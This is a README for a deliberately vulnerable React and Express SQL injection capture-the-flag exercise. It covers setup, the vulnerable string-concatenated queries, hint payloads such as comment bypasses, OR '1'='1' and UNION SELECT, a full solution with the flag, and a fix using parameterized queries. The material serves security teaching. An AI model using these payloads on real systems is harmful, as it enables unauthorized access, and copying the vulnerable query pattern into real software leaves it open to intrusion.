# SQL Injection CTF Challenge - Vulnerable React App

A deliberately vulnerable React web application designed for educational purposes to teach SQL injection attacks and defensive programming.

## ⚠️ WARNING

This application contains **intentional security vulnerabilities** for educational purposes only. Do NOT use this in production or expose it to the internet.

## 📋 Overview

This CTF challenge features:
- A React frontend with login and user search forms
- A vulnerable Node.js/Express backend with SQL injection flaws
- SQLite database with sample data and a hidden flag
- Multiple attack vectors for exploitation

## 🛠️ Prerequisites

- Node.js v14 or higher
- npm or yarn package manager
- Basic understanding of SQL and HTTP requests

## 📦 Installation

### 1. Install Backend Dependencies

```bash
cd backend
npm install
```

### 2. Install Frontend Dependencies

```bash
cd ../frontend
npm install
```

## 🚀 Running the Application

### Terminal 1 - Start the Backend Server

```bash
cd backend
npm start
```

You should see:
```
🚀 Server running on http://localhost:5000
⚠️  WARNING: This server contains intentional vulnerabilities for educational purposes only!
```

### Terminal 2 - Start the React App

```bash
cd frontend
npm start
```

The app should automatically open at `http://localhost:3000`

## 🎯 Challenge Objective

Your mission: **Extract the flag from the database using SQL injection**

The flag is stored in the `secrets` table and has the format: `FLAG{...}`

## 🔍 Vulnerable Endpoints

### 1. Login Form (`POST /api/login`)
- **Vulnerable Parameter**: `username` and `password`
- **Vulnerable Code**: String concatenation in SQL query
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`
```

### 2. User Search (`GET /api/user/:username`)
- **Vulnerable Parameter**: `username` in URL path
- **Vulnerable Code**: String concatenation in SQL query
```javascript
const query = `SELECT * FROM users WHERE username = '${username}'`
```

## 💡 Exploitation Hints

### Hint 1: Bypass Authentication
Try using comment sequences to bypass the password check:
```
Username: admin' -- 
Password: anything
```

### Hint 2: Boolean-Based Injection
Use SQL operators to control the query logic:
```
Username: admin' OR '1'='1
Password: anything
```

### Hint 3: UNION-Based Injection (Advanced)
Extract data from other tables:
```
Username: ' UNION SELECT id, username, password, flag FROM secrets -- 
Password: anything
```

### Hint 4: Database Reconnaissance
Discover table structure:
```
Username: ' UNION SELECT NULL, NULL, NULL, NULL LIMIT 1 -- 
Password: anything
```

## 📊 Database Schema

### Users Table
```sql
CREATE TABLE users (
  id INTEGER PRIMARY KEY,
  username TEXT UNIQUE,
  password TEXT,
  email TEXT
);
```

**Sample Data:**
- username: `admin`, password: `admin123`, email: `admin@ctf.local`
- username: `user`, password: `password123`, email: `user@ctf.local`

### Secrets Table
```sql
CREATE TABLE secrets (
  id INTEGER PRIMARY KEY,
  username TEXT,
  password TEXT,
  flag TEXT
);
```

**Contains:**
- The hidden flag in the `flag` column

## 🎓 Expected Exploitation Steps

1. Open the application in your browser
2. Try basic login attempts to understand the form
3. Identify the SQL injection vulnerability in the username field
4. Craft a SQL injection payload to bypass authentication or extract data
5. Use UNION SELECT to extract the flag from the secrets table
6. Submit the flag

## ✅ Solution Example

### Successful Payload:
```
Username: ' UNION SELECT username, password, id, flag FROM secrets -- 
Password: anything
```

### Expected Response:
```json
{
  "success": true,
  "message": "Login successful",
  "user": {
    "username": "admin",
    "password": "super_secret",
    "id": 1,
    "flag": "FLAG{SQL_INJ3CT10N_M4ST3R}"
  }
}
```

## 🛡️ How to Fix This Vulnerability

Replace vulnerable string concatenation with **parameterized queries**:

```javascript
// ❌ VULNERABLE (DON'T USE)
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`

// ✅ SECURE (USE THIS)
const query = 'SELECT * FROM users WHERE username = ? AND password = ?'
db.get(query, [username, password], (err, result) => { ... })
```

## 📚 Learning Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

## 🧹 Cleanup

To stop the application:
1. Press `Ctrl+C` in both terminals
2. The database will be properly closed

## 📁 Project Structure

```
sqli/
├── chall.txt           (Challenge description)
├── backend/
│   ├── package.json
│   ├── server.js       (Express server with vulnerable endpoints)
│   └── database.db     (SQLite database - auto-created)
└── frontend/
    ├── package.json
    ├── public/
    │   └── index.html
    └── src/
        ├── index.js
        ├── index.css
        ├── App.js      (React component with forms)
        └── App.css
```

## 🚨 Important Notes

- This application uses `sqlite3` which creates an in-memory database
- Database is reset each time the server restarts
- For persistence, you can modify the backend to use a file-based database
- Never use this code as a reference for production applications
- Always use parameterized queries in real applications

## 📝 License

Educational use only. Do not redistribute without permission.

---

**Good luck with the challenge! Happy hacking! 🎯**
